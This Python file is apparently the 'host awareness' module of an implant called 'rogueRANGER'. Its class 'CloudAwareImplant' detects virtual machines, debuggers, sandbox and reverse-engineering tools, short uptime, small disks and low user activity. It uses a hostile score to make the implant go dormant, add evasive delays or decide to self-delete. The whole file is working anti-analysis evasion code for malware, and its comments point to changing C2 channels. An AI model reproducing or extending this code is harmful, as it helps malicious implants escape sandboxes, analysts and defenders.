#!/usr/bin/env python3
"""
Host Awareness Module for rogueRANGER
Enhanced environment detection with sandbox/VM analysis
Based on predecessor's improvements
"""

import os
import sys
import time
import platform
import subprocess
import hashlib
from typing import Dict, List, Optional, Tuple
import ctypes
import ctypes.util

class CloudAwareImplant:
    """
    Enhanced host awareness with comprehensive sandbox detection
    Periodically re-evaluates environment and adapts behavior
    """
    
    def __init__(self, debug: bool = False):
        self.debug = debug
        self.system = platform.system().lower()
        self.hostname = platform.node()
        
        # Platform detection
        self.is_windows = self.system == 'windows'
        self.is_linux = self.system == 'linux'
        self.is_macos = self.system == 'darwin'
        
        # Environment tracking
        self.environment_scores = {}
        self.last_check = 0
        self.check_interval = 300  # 5 minutes
        self.hostile_threshold = 30
        
        # Behavior adaptation
        self.current_behavior = "normal"
        self.behavior_modes = {
            "normal": self._behavior_normal,
            "cautious": self._behavior_cautious,
            "dormant": self._behavior_dormant,
            "evasive": self._behavior_evasive
        }
    
    def is_hostile_environment(self) -> Tuple[bool, int, List[str]]:
        """
        Comprehensive hostile environment detection
        Returns: (is_hostile, score, detected_threats)
        Based on predecessor's implementation with enhancements
        """
        hostile_score = 0
        detected_threats = []
        
        # 1. Check VM artifacts
        vm_files = [
            "/sys/class/dmi/id/product_name",
            "/sys/class/dmi/id/sys_vendor",
            "/sys/class/dmi/id/chassis_asset_tag",
            "/sys/class/dmi/id/bios_version",
            "/sys/class/dmi/id/product_version"
        ]
        
        for vm_file in vm_files:
            if os.path.exists(vm_file):
                try:
                    with open(vm_file, 'r') as fp:
                        content = fp.read().lower()
                    
                    vm_indicators = ['virtualbox', 'vmware', 'qemu', 'kvm', 'xen', 
                                    'amazon', 'google', 'microsoft', 'oracle', 'digitalocean']
                    
                    for indicator in vm_indicators:
                        if indicator in content:
                            hostile_score += 10
                            detected_threats.append(f"VM indicator in {vm_file}: {indicator}")
                            if self.debug:
                                print(f"[HOST AWARE] VM detected: {indicator} in {vm_file}")
                            break
                except:
                    pass
        
        # 2. Check for debugger (ptrace on Linux)
        if self.is_linux:
            try:
                with open('/proc/self/status') as f:
                    for line in f:
                        if line.startswith('TracerPid:'):
                            tracer_pid = line.split()[1]
                            if tracer_pid != '0':
                                hostile_score += 50
                                detected_threats.append(f"Debugger attached (PID: {tracer_pid})")
                                if self.debug:
                                    print(f"[HOST AWARE] Debugger detected via ptrace (PID: {tracer_pid})")
                            break
            except:
                pass
        
        # 3. Check for common sandbox/analysis processes
        sandbox_procs = [
            'procmon.exe', 'wireshark.exe', 'fiddler.exe', 'tcpview.exe', 'processhacker.exe',
            'ollydbg.exe', 'x64dbg.exe', 'ida.exe', 'ida64.exe', 'ghidra.exe',
            'cuckoo', 'joesandbox', 'vmsrvc', 'vboxtray', 'vmtoolsd'
        ]
        
        try:
            if self.is_windows:
                # Windows process check
                try:
                    import wmi
                    c = wmi.WMI()
                    for process in c.Win32_Process():
                        name = process.Name.lower()
                        for proc in sandbox_procs:
                            if proc.lower() in name:
                                hostile_score += 20
                                detected_threats.append(f"Sandbox process: {name}")
                                if self.debug:
                                    print(f"[HOST AWARE] Sandbox process detected: {name}")
                                break
                except:
                    # Fallback to tasklist
                    result = subprocess.run(
                        ['tasklist', '/FO', 'CSV'],
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    if result.returncode == 0:
                        output = result.stdout.lower()
                        for proc in sandbox_procs:
                            if proc.lower() in output:
                                hostile_score += 20
                                detected_threats.append(f"Sandbox process in tasklist: {proc}")
                                break
            
            elif self.is_linux or self.is_macos:
                # Unix process check
                result = subprocess.run(
                    ['ps', 'aux'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    output = result.stdout.lower()
                    for proc in sandbox_procs:
                        if proc.lower() in output:
                            hostile_score += 20
                            detected_threats.append(f"Sandbox process: {proc}")
                            break
        
        except Exception as e:
            if self.debug:
                print(f"[HOST AWARE] Process check error: {e}")
        
        # 4. Check user activity (if no input for a long time)
        # This would need to run in a thread and track time since last input
        # For now, simplified check
        try:
            if not self.is_windows:
                # Check for recent user file activity
                home_dir = os.path.expanduser('~')
                recent_files = 0
                
                for root, dirs, files in os.walk(home_dir):
                    for file in files[:10]:  # Limit for performance
                        filepath = os.path.join(root, file)
                        try:
                            mtime = os.path.getmtime(filepath)
                            if time.time() - mtime < 3600:  # Modified in last hour
                                recent_files += 1
                        except:
                            pass
                
                if recent_files < 3:
                    hostile_score += 10
                    detected_threats.append(f"Low user activity ({recent_files} recent files)")
        
        except:
            pass
        
        # 5. Check uptime
        try:
            if self.is_linux:
                with open('/proc/uptime') as f:
                    uptime = float(f.read().split()[0])
                if uptime < 600:  # less than 10 minutes
                    hostile_score += 15
                    detected_threats.append(f"Short uptime: {uptime:.0f}s")
                    if self.debug:
                        print(f"[HOST AWARE] Short uptime detected: {uptime:.0f}s")
            
            elif self.is_windows:
                # Windows uptime check
                try:
                    import ctypes
                    lib = ctypes.windll.kernel32
                    tick_count = lib.GetTickCount()
                    uptime_ms = tick_count
                    uptime = uptime_ms / 1000.0
                    
                    if uptime < 600:  # less than 10 minutes
                        hostile_score += 15
                        detected_threats.append(f"Short Windows uptime: {uptime:.0f}s")
                except:
                    pass
        
        except:
            pass
        
        # 6. Check disk size (sandboxes often have small disks)
        try:
            if self.is_linux or self.is_macos:
                result = subprocess.run(
                    ['df', '-h', '/'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    lines = result.stdout.strip().split('\n')
                    if len(lines) > 1:
                        parts = lines[1].split()
                        if len(parts) >= 2:
                            size_str = parts[1]
                            if 'G' in size_str:
                                size_gb = float(size_str.replace('G', ''))
                            elif 'M' in size_str:
                                size_gb = float(size_str.replace('M', '')) / 1024
                            else:
                                size_gb = float(size_str) / (1024**3)
                            
                            if size_gb < 50:  # less than 50GB
                                hostile_score += 10
                                detected_threats.append(f"Small disk: {size_gb:.1f}GB")
        
        except:
            pass
        
        # 7. Check for analysis tools directories
        tool_dirs = [
            "C:\\Program Files\\IDA Pro",
            "C:\\Program Files\\x64dbg",
            "C:\\Program Files\\OllyDbg",
            "/usr/share/ida",
            "/opt/ida",
            "/Applications/IDA Pro.app"
        ]
        
        for tool_dir in tool_dirs:
            if os.path.exists(tool_dir):
                hostile_score += 25
                detected_threats.append(f"Analysis tool directory: {tool_dir}")
                if self.debug:
                    print(f"[HOST AWARE] Analysis tool directory detected: {tool_dir}")
        
        # 8. Check for debugger environment variables
        debugger_env_vars = ['DEBUG', 'PYTHONDEBUG', 'PYDEVD', 'PYCHARM', 
                            'VSCODE_DEBUG', 'PTVSD', 'DEBUGPY']
        
        for env_var in debugger_env_vars:
            if env_var in os.environ:
                hostile_score += 15
                detected_threats.append(f"Debugger environment variable: {env_var}")
                if self.debug:
                    print(f"[HOST AWARE] Debugger env var detected: {env_var}")
        
        # Determine if hostile
        is_hostile = hostile_score > self.hostile_threshold
        
        if self.debug:
            print(f"[HOST AWARE] Hostile score: {hostile_score} (threshold: {self.hostile_threshold})")
            print(f"[HOST AWARE] Is hostile: {is_hostile}")
            if detected_threats:
                print(f"[HOST AWARE] Detected threats: {detected_threats}")
        
        return is_hostile, hostile_score, detected_threats
    
    def adapt_behavior(self, hostile_score: int, threats: List[str]) -> str:
        """
        Adapt behavior based on environment analysis
        Returns: New behavior mode
        """
        old_behavior = self.current_behavior
        
        if hostile_score > 50:
            self.current_behavior = "dormant"
        elif hostile_score > 30:
            self.current_behavior = "evasive"
        elif hostile_score > 15:
            self.current_behavior = "cautious"
        else:
            self.current_behavior = "normal"
        
        if old_behavior != self.current_behavior:
            if self.debug:
                print(f"[HOST AWARE] Behavior changed: {old_behavior} -> {self.current_behavior}")
            
            # Apply new behavior
            self.behavior_modes[self.current_behavior]()
        
        return self.current_behavior
    
    def _behavior_normal(self):
        """Normal operation mode"""
        # Full functionality
        pass
    
    def _behavior_cautious(self):
        """Cautious operation mode"""
        # Reduced network activity
        # Longer delays between operations
        # Limited command execution
        pass
    
    def _behavior_dormant(self):
        """Dormant mode - minimal activity"""
        # Go to sleep for extended period
        # No network activity
        # Wait for environment to change
        if self.debug:
            print("[HOST AWARE] Entering dormant mode")
        
        # Sleep for 1-2 hours
        import random
        sleep_time = random.randint(3600, 7200)  # 1-2 hours
        time.sleep(sleep_time)
    
    def _behavior_evasive(self):
        """Evasive mode - active evasion"""
        # Change C2 channels
        # Use different encryption
        # Alter behavioral patterns
        # Consider self-deletion if too risky
        if self.debug:
            print("[HOST AWARE] Entering evasive mode")
        
        # Add random delays
        import random
        delay = random.uniform(5.0, 30.0)
        time.sleep(delay)
    
    def periodic_check(self) -> Tuple[bool, int, str]:
        """
        Perform periodic environment check
        Returns: (is_hostile, score, behavior_mode)
        """
        current_time = time.time()
        
        # Check if enough time has passed
        if current_time - self.last_check < self.check_interval:
            return False, 0, self.current_behavior
        
        self.last_check = current_time
        
        # Perform environment analysis
        is_hostile, score, threats = self.is_hostile_environment()
        
        # Adapt behavior
        behavior = self.adapt_behavior(score, threats)
        
        # Store results
        self.environment_scores[current_time] = {
            'score': score,
            'hostile': is_hostile,
            'threats': threats,
            'behavior': behavior
        }
        
        return is_hostile, score, behavior
    
    def get_environment_report(self) -> Dict[str, any]:
        """Generate comprehensive environment report"""
        is_hostile, score, threats = self.is_hostile_environment()
        
        return {
            'system': self.system,
            'hostname': self.hostname,
            'hostile': is_hostile,
            'score': score,
            'threats': threats,
            'behavior': self.current_behavior,
            'last_check': self.last_check,
            'check_interval': self.check_interval,
            'hostile_threshold': self.hostile_threshold,
            'timestamp': time.time()
        }
    
    def should_self_delete(self) -> bool:
        """Determine if implant should self-delete due to high risk"""
        is_hostile, score, threats = self.is_hostile_environment()
        
        # Self-delete conditions:
        # 1. Very high hostile score
        # 2. Specific high-risk threats detected
        # 3. Multiple consecutive hostile checks
        
        if score > 75:
            return True
        
        high_risk_threats = ['Debugger attached', 'Analysis tool directory']
        for threat in threats:
            for high_risk in high_risk_threats:
                if high_risk in threat:
                    return True
        
        return False

def test_host_awareness():
    """Test function for host awareness module"""
    print("Testing Host Awareness Module")
    print("=" * 60)
    
    detector = CloudAwareImplant(debug=True)
    
    print(f"System: {detector.system}")
    print(f"Hostname: {detector.hostname}")
    print(f"Hostile Threshold: {detector.hostile_threshold}")
    
    print("\nRunning environment analysis...")
    is_hostile, score, threats = detector.is_hostile_environment()
    
    print(f"\nAnalysis Results:")
    print(f"  Hostile: {is_hostile}")
    print(f"  Score: {score}")
    print(f"  Behavior: {detector.current_behavior}")
    
    if threats:
        print(f"\n  Detected Threats:")
        for threat in threats:
            print(f"    • {threat}")
    
    print("\nAdapting behavior...")
    behavior = detector.adapt_behavior(score, threats)
    print(f"  New Behavior: {behavior}")
    
    print("\nGenerating environment report...")
    report = detector.get_environment_report()
    
    print(f"\nReport Summary:")
    for key, value in report.items():
        if key not in ['threats', 'timestamp']:
            print(f"  {key:20} : {value}")
    
    print(f"\nSelf-delete recommended: {detector.should_self_delete()}")
    
    return report

if __name__ == "__main__":
    test_host_awareness()